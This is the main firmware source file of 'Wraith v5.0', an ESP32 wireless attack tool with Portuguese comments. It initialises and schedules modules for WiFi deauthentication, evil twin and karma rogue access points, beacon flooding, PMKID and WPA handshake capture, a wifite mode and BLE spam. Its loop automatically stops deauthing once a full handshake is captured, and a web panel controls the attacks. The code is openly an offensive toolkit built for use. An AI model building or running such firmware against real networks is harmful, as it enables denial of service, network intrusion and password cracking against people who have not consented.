#include <Arduino.h>
#include <LittleFS.h>
#include <ESPmDNS.h>
#include <esp_task_wdt.h>
#include "soc/soc.h"
#include "soc/rtc_cntl_reg.h"

// USB CDC — habilita console serial via porta USB-C esquerda (OTG)
// Com ARDUINO_USB_CDC_ON_BOOT=1 no platformio.ini, Serial roteia para USB CDC
// automaticamente. Para forçar log duplo (USB + UART), use USB_SERIAL_JTAG ou
// esp_log_set_vprintf para duplicar saída — aqui usamos o Serial padrão.
#if ARDUINO_USB_CDC_ON_BOOT
#include "USB.h"
#include "USBCDC.h"
#endif

#include "config.h"
#include "utils/logger.h"
#include "utils/rgb_led.h"
#include "utils/channel_map.h"
#ifdef BATTERY_PIN
#include "utils/battery.h"
#endif
#include "wifi/scanner.h"
#include "wifi/deauth.h"
#include "wifi/sniffer.h"
#include "wifi/evil_twin.h"
#include "wifi/beacon_flood.h"
#include "wifi/karma.h"
#include "wifi/radio2.h"
#include "wifi/usb_radio.h"
#include "wifi/usb_rtl8188.h"
#include "wifi/pmkid_fisher.h"
#include "wifi/wps_scanner.h"
#include "wifi/target_intel.h"
#include "wifi/hidden_scanner.h"
#include "wifi/wifite_mode.h"
#include "wifi/led_attack.h"
#include "bluetooth/ble_scanner.h"
#include "bluetooth/bt_classic.h"
#include "bluetooth/ble_spam.h"
#include "web/server.h"

// Determina o estado do LED RGB com base nos módulos ativos
static RGBLed::State _ledState() {
    if (EvilTwin::get().running)     return RGBLed::CLONE;
    if (Deauther::get().running   ||
        BeaconFlood::get().running ||
        KarmaAttack::get().running ||
        PMKIDFisher::get().running ||
        BLESpam::get().running     ||
        WifiteMode::get().running  ||
        LEDAttack::get().running)  return RGBLed::ATTACK;
    if (Sniffer::get().running)      return RGBLed::SCAN;
    return RGBLed::IDLE;
}

void attackTask(void*) {
    for (;;) {
        Deauther::get().tick();
        BeaconFlood::get().tick();
        Sniffer::get().tick();
        EvilTwin::get().tick();
        Radio2::get().tick();
        USBRadio::get().tick();
#ifdef USB_RTL8188
        USBRTL8188::get().tick();
#endif
        PMKIDFisher::get().tick();
        HiddenScanner::get().tick();
        WifiteMode::get().tick();
        LEDAttack::get().tick();

        // Auto-stop deauth quando handshake completo capturado
        if (Deauther::get().running && Deauther::get().autoCapture) {
            auto& hs = Sniffer::get().handshakes;
            String apStr = Deauther::bssidStr(Deauther::get().targetAP);
            int m1=0, m2=0;
            for (auto& h : hs) {
                if (h.bssid == apStr || h.client == apStr) {
                    if (h.type == 1) m1++;
                    if (h.type == 2) m2++;
                }
            }
            if (m1 > 0 && m2 > 0) {
                Deauther::get().stop();
                RGBLed::get().flashFound();
                LOG.success("[AUTO] Handshake M1+M2 completo para " + apStr + " — deauth parado");
            }
        }

        // Atualiza estado do LED RGB
        RGBLed::get().setState(_ledState());
        RGBLed::get().tick();

        vTaskDelay(pdMS_TO_TICKS(16));
    }
}

void bleTask(void*) {
    for (;;) {
        BLESpam::get().tick();
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}

// Botão BOOT (GPIO 0) — pausa/retoma ataques ativos com 1 clique
// 2 cliques rápidos → scan rápido de redes
static bool  _btnPause     = false;
static int   _btnClicks    = 0;
static unsigned long _btnLast = 0;

static void IRAM_ATTR _bootIsr() {
    unsigned long now = millis();
    if (now - _btnLast > 50) { // debounce 50ms
        _btnClicks++;
        _btnLast = now;
    }
}

static void _processBoot() {
    if (_btnClicks == 0) return;
    unsigned long now = millis();
    if (now - _btnLast < 300) return; // espera fim de sequência de cliques

    int clicks = _btnClicks;
    _btnClicks = 0;

    if (clicks == 1) {
        _btnPause = !_btnPause;
        if (_btnPause) {
            Deauther::get().stop();
            BeaconFlood::get().stop();
            LOG.warn("[BTN] Ataques pausados (pressione novamente para retomar)");
            RGBLed::get().flashError();
        } else {
            LOG.info("[BTN] Ataques retomados");
        }
    } else if (clicks == 2) {
        LOG.info("[BTN] Scan rápido iniciado...");
        WiFiScanner::get().scan();
    }
}

void setup() {
    // Desabilita detector de brownout ANTES de qualquer init
    // O WiFi drena ~300mA no pico; fontes USB comuns caem abaixo do limiar
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);

    Serial.begin(115200);
    // USB CDC: o mesmo Serial já é roteado para USB com CDC_ON_BOOT=1
    // Aguarda até 2s pela conexão USB (não bloqueia se não conectado)
#if ARDUINO_USB_CDC_ON_BOOT
    unsigned long _usbWait = millis();
    while (!Serial && millis() - _usbWait < 2000) delay(10);
    USB.begin();
#endif
    Serial.println("\n\n=== Wraith v5.0 ===");

    // LED RGB — pisca branco no boot
    RGBLed::get().begin();

    // Botão BOOT como controle de ataque
    pinMode(0, INPUT_PULLUP);
    attachInterrupt(digitalPinToInterrupt(0), _bootIsr, FALLING);

    pinMode(LED_STATUS, OUTPUT);
    digitalWrite(LED_STATUS, LOW);

    esp_task_wdt_init(30, true);
    esp_task_wdt_add(nullptr);

    if (!LittleFS.begin(false)) {
        LOG.warn("LittleFS mount falhou — formatando...");
        LittleFS.begin(true);
    }
    LOG.info("FS OK — livre: " + String((LittleFS.totalBytes() - LittleFS.usedBytes()) / 1024) + " KB");

    // Web server + AP WiFi
    WebServer::get().begin();

    // mDNS -> http://wraith.local
    if (MDNS.begin(MDNS_HOST)) {
        MDNS.addService("http", "tcp", 80);
        LOG.success("mDNS: http://" MDNS_HOST ".local");
    }

    // Karma: conecta callback do sniffer ao karma attack
    Sniffer::get().onProbe = [](const uint8_t* mac, const char* ssid, uint8_t ch) {
        KarmaAttack::get().onProbe(mac, ssid, ch);
        TargetIntel::get().updateDevice(WiFiScanner::bssidToStr(mac), 0, String(ssid));
    };

    // Deauther: bloqueia sniffer no canal do alvo durante ataque
    Deauther::get().fnLockChannel = [](uint8_t ch) { Sniffer::get().lockChannel(ch); };
    Deauther::get().fnResumeHop   = []()            { Sniffer::get().resumeHop(); };

    // Inicializa ChannelMap (#42)
    ChannelMap::get().begin();
    // Popula ChannelMap com o scan inicial de redes
    WiFiScanner::get().scan();
    for (auto& ap : WiFiScanner::get().aps())
        ChannelMap::get().addNetwork(ap.channel, ap.rssi);
    LOG.info("[CHAN] Melhor canal livre: " + String(ChannelMap::get().bestFreeChannel()));

#ifdef BATTERY_PIN
    BatteryMonitor::get().begin();
    LOG.info("[BATT] " + BatteryMonitor::get().statusJson());
#endif

    Radio2::get().begin();
    USBRadio::get().begin();
#ifdef USB_RTL8188
    USBRTL8188::get().begin();
    // Encaminha frames capturados pelo RTL8188 para o sniffer
    USBRTL8188::get().onFrame = [](const uint8_t* f, size_t l, int8_t rssi, uint8_t ch) {
        Sniffer::get().processFrame(f, l, ch);
    };
#endif
    BLEScanner::get().begin();
    NimBLEDevice::init("Wraith");

    // FreeRTOS tasks
    xTaskCreatePinnedToCore(attackTask, "attacks", 16384, nullptr, 1, nullptr, 0);
    xTaskCreatePinnedToCore(bleTask,    "ble_spam", 4096, nullptr, 1, nullptr, 1);

    digitalWrite(LED_STATUS, HIGH);
    LOG.success("Wraith v5.0 | AP: " AP_SSID " | http://" MDNS_HOST ".local");
    LOG.info("Heap: " + String(ESP.getFreeHeap() / 1024) + " KB livre");
}

void loop() {
    esp_task_wdt_reset();
    WebServer::get().tick();
    _processBoot();
    delay(8);
}
